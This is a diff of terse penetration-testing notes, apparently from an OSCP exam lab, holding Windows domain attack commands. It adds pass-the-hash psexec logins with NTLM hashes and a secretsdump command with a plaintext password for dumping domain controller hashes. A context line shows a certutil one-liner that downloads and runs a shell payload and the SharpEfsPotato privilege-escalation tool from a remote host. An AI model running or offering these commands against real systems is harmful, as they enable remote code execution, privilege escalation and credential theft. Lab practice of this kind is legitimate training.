@@ -14,12 +14,18 @@ MS01 nt authority psexec login
 impacket-psexec SRV22.oscp.exam/Administrator@192.168.123.206 -hashes aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715
 ```
 
+DC01 ADMIN HASH
+```
+impacket-psexec DC20.OSCP.EXAM/Administrator@172.16.123.200 -hashes aad3b435b51404eeaad3b435b51404ee:696d727b83df00989facf251aa343f03
+```
 
 ```
 powershell -ep bypass; cd C:\Windows\Tasks; certutil -urlcache -split -f http://192.168.49.123/shell.exe shell.exe; certutil -urlcache -split -f http://192.168.49.123/SharpEfsPotato.exe SharpEfsPotato.exe; ./SharpEfsPotato.exe -p shell.exe
 ```
 
-
+```
+impacket-secretsdump 'oscp.exam/u.gregory:GregsNewBrand551@DC20.OSCP.EXAM' -just-dc
+```
 
 ```
 aad3b435b51404eeaad3b435b51404ee:2a00a0a55d5a916e79c91ad30e770715
